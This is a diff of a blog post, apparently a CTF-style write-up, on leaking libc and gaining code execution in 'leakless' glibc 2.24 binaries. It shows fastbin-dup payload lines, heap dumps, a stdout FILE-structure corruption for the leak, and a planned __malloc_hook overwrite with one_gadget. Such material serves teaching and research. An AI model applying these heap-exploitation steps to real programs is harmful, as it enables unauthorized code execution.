@@ -9,19 +9,19 @@ This blog post will explain how to achieve a leak or full rce in leakless binari
 
 # Assumptions:
 
-*   The exploit will be developped in glibc2.24 _(it can work in tcache as well)_.
+*   The exploit will be developped in `glibc2.24` _(it can work in tcache as well)_.
 *   We will have someway to control size of a chunk , off by one bug or double free can work.
 *   We will be using a double free attack _(fastbin dup)_ .
 *   The binary has only the option to malloc and free.
 *   The binary has full protections.
-*   Malloc size limit is 0x80.
-*   We can at maximum allocate 15 chunks in total.
+*   Malloc size limit is `0x80`.
+*   We can at maximum allocate `15` chunks in total.
 
 # The exploit: 
 
 At first we will try to get a chunk to unsortedbin , this way we will have main_arena pointers , we will use double  free for this.
 
-Let's allocate 3 chunks the 0x41 values will be used later to free a fake chunk.
+Let's allocate 3 chunks the `0x41` values will be used later to free a fake chunk.
 ```python
 malloc(0x40-8, 'B'*0x18 + p64(0x41))
 malloc(0x70-8, 'C'*0x18 + p64(0x41)*3)
@@ -72,7 +72,7 @@ Bins state :
             unsortbin: 0x0
 ```
 
-Now we will partially overwrite the fd of chunk0 and make it point to 0x558e29d16020 which will be a chunk with size 0x40
+Now we will partially overwrite the fd of chunk0 and make it point to `0x558e29d16020` which will be a chunk with size `0x40`
 
 ```python
 malloc(0x40-8, '\x20')
@@ -83,7 +83,7 @@ Bins state:
 ```python
 (0x40)     fastbin[2]: 0x560e0ada50b0 --> 0x560e0ada5000 --> 0x560e0ada5020 (overlap chunk with 0x560e0ada5000(freed) )
 ```
-Now we will empty our fastbins[2] and continue our fastbin attack and use the chunk 0x560e0ada5020 to modify the size of the chunk 1 to 0xb1
+Now we will empty our fastbins[2] and continue our fastbin attack and use the chunk `0x560e0ada5020` to modify the size of the chunk 1 to `0xb1`
 
 ```python
 malloc(0x40-8, 'K')
@@ -111,7 +111,7 @@ The heap status now :
 0x56271941b0f0: 0x0000000000000000  0x0000000000020f11
 ```
 
-All we need to do now is free chunk 1 it will go directly to unsorted bin, let's go back to our code and add another chunk before topchunk, to avoid consolidation since 0x40+0xb0 = 0xf0
+All we need to do now is free chunk 1 it will go directly to unsorted bin, let's go back to our code and add another chunk before topchunk, to avoid consolidation since `0x40+0xb0 = 0xf0`
 
 ```python
 free(1)
@@ -144,7 +144,7 @@ The heap will look like :
 0x556c3f05e160: 0x0000000000000000  0x0000000000020ea1
 ```
 
-The next step is to have a fastbin chunk of size 0x70 with main_arena as fd, and we need to partially overwrite that fd as well.
+The next step is to have a fastbin chunk of size `0x70` with main_arena as fd, and we need to partially overwrite that fd as well.
 Now we can do this using another fresh fastbindup attack with new chunks, but it will consume lot of mallocs.
 let's dump the array of the chunks to have a  better look
 
@@ -155,7 +155,7 @@ let's dump the array of the chunks to have a  better look
 0x56077d825070: 0x000056077f21e010  0x000056077f21e030
 ```
 
-An important thing to notice is that chunk at index 7 is right before our unsorted chunk, what we can do is free it and realloc it, and change size now from 0xb1 to 0x71 
+An important thing to notice is that chunk at index 7 is right before our unsorted chunk, what we can do is free it and realloc it, and change size now from `0xb1` to `0x71` 
 
 the result :
 ```python
@@ -217,7 +217,7 @@ and
 0x558d9f577060: 0x4343434343434343  0x0000000000000041
 0x558d9f577070: 0x0000000000000041  0x0000000000000041
 ```
-we can again change our code and when we change the size to 0x71, we partially overwrite the fd to point near &stdout-0x43
+we can again change our code and when we change the size to `0x71`, we partially overwrite the fd to point near `&stdout-0x43`
 why ? :
 when the binary calls `puts`, `puts` internally will call a function named `_IO_new_file_xsputn` which will call eventually `_IO_new_file_overflow`
 ```c
@@ -300,7 +300,7 @@ malloc(0x70-8, 'D'*27 + p64(0x0)*3 + p64(0xfbad1800) + p64(0x0)*3 + "\x08")
 ```
 
 
-Finally we will use the address at &stdout-0x71 , because it is the only viable place with a valid size (0x7f) before &stdout:
+Finally we will use the address at `&stdout-0x71` , because it is the only viable place with a valid size (`0x7f`) before `&stdout`:
 
 ```python
 0x7fc1cadfc5dd <_IO_2_1_stderr_+157>:   0xc1cadfb660000000  0x000000000000007f
@@ -325,4 +325,4 @@ except :
 ```
 while :; do  python exploit.py; done```
 
-and eventually we will hit the jackpot and get a leak, after this we we still have 5 possible allocations, which is more than enough for a second fastbin dup on __malloc_hook and overwrite with one_gadget
+and eventually we will hit the jackpot and get a leak, after this we we still have 5 possible allocations, which is more than enough for a second fastbin dup on `__malloc_hook` and overwrite it  with `one_gadget`.
